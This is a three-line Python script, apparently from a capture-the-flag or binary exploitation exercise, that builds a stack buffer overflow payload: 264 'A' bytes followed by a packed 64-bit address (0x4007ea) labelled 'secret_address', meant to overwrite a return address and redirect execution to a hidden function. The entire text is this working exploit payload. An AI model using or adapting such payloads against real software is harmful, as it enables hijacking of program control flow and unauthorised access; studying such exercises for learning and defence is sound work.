from struct import pack
secret_address = pack("<Q", 0x4007ea)
print("A" * 264 + secret_address)
